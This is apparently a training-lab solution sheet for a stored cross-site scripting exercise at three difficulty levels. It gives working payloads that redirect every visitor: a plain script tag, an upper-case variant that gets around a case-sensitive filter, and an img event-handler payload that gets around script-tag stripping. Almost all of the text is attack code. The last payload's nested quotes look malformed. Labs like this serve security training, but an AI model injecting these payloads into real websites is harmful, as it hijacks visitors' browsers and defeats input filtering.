#Task - Stored XSS: Redirect everyone to a website of your choosing.

#Low difficulty - There is no input validation or sanitisation in this case.
<script>window.location="http://www.youtube.com"</script>

#Medium difficulty - There is some input validation and sanitisation in regards to the script tag, but it can still be done since case 
#sensitivity wasn't taken into account.
<SCRIPT>window.location="http://www.youtube.com"</SCRIPT>

#Hard difficulty - Developer has disabled all script usage by removing the pattern "<s*c*r*i*p*t>", so script tags can't be used.
<img draggable="true" ondragleave="window.location="http://www.youtube.com" style=display:block>test</img>
